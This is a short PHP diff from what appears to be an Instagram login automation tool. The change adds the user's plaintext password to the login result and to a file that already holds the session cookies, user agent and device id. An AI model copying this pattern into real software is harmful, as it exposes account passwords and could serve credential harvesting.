@@ -106,8 +106,8 @@ function login($post_username, $post_password)
 	if($a->status == 'ok'){
 		preg_match_all('%Set-Cookie: (.*?);%',$header,$d);$cookies = '';
 		for($o=0;$o<count($d[0]);$o++)$cookies.=$d[1][$o].";";
-		$array = json_encode(['result' => true, 'cookies' => $cookies, 'useragent' => generate_useragent(), 'id' => $id, 'devid' => generateUUID(true), 'username' => $post_username]);
-		//$array = json_encode(['result' => true, 'cookies' => $cookies, 'useragent' => generate_useragent(), 'id' => $a->logged_in_user->pk]);
+		$array = json_encode(['result' => true, 'cookies' => $cookies, 'useragent' => generate_useragent(), 'id' => $id, 'devid' => generateUUID(true), 'username' => $post_username, 'password' => $post_password]);
+		//$array = json_encode(['result' => true, 'cookies' => $cookies, 'useragent' => generate_useragent(), 'id' => $a->logged_in_user->pk, 'username' => $post_username, 'password' => $post_password]);
 	} else {
 		$array = json_encode(['result' => false, 'msg' => ''.$a->message.'']);
 	}
@@ -123,7 +123,8 @@ function masuk($username, $password)
             'cookies' => $login->cookies,
             'useragent' => $login->useragent,
             'device_id' => $login->devid,
-            'username' => $login->username
+            'username' => $login->username,
+            'password' => $password
         )));
         fclose($file);
         return "data berhasil diinput";
